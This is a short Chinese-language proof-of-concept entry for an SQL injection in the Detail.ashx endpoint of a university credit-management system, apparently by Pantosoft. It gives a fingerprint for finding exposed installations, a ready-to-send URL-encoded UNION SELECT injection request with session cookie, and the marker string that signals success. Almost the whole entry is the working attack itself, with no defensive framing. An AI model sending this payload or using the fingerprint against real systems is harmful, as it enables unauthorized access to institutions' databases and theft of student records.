# 学分制系统Detail存在SQL注入漏洞

- **系统**：学分制系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body="www.pantosoft.com"`
- **请求**：`GET /WebService/Detail.ashx?typeCode=T-7&InstanceID=1%27+UNION+ALL+SELECT+NULL%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%2BCHAR%2890%29%2BCHAR%2870%29%2BCHAR%28104%29%2BCHAR%2883%29%2BCHAR%2877%29%2BCHAR%2870%29%2BCHAR%2885%29%2BCHAR%2880%29%2BCHAR%2867%29%2BCHAR`
- **关键头**：`Cookie: ASP.NET_SessionId=jpz4tumazx100m52qnixrliz`　`Priority: u=1`
- **预期**：200　|　qxbkqZFhSMFUPCFiDggDAULvuVEwjwhMPnMLaWNcmExzQqpzxq